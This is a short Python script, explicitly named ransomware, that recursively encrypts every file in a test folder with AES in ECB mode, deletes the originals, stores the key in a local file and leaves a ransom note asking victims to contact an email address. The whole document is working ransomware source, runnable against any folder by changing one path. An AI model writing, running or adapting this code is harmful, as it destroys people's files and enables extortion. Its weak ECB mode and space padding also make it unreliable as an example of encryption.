from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os

FOLDER = "./test_folder/"
KEY_FILE = "key.bin"

def pad(s):
    return s + b" " * (16 - len(s) % 16)

def encrypt_file(path, key):
    with open(path, 'rb') as f:
        data = pad(f.read())
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted = cipher.encrypt(data)
    with open(path + ".locked", 'wb') as f:
        f.write(encrypted)
    os.remove(path)

def ransomware():
    key = get_random_bytes(32)
    with open(KEY_FILE, 'wb') as f:
        f.write(key)

    for root, dirs, files in os.walk(FOLDER):
        for file in files:
            if not file.endswith(".locked"):
                full_path = os.path.join(root, file)
                encrypt_file(full_path, key)

    with open(os.path.join(FOLDER, "README.txt"), 'w') as f:
        f.write("Your files have been encrypted.\nContact admin@example.com to recover them.\n")

if __name__ == "__main__":
    ransomware()
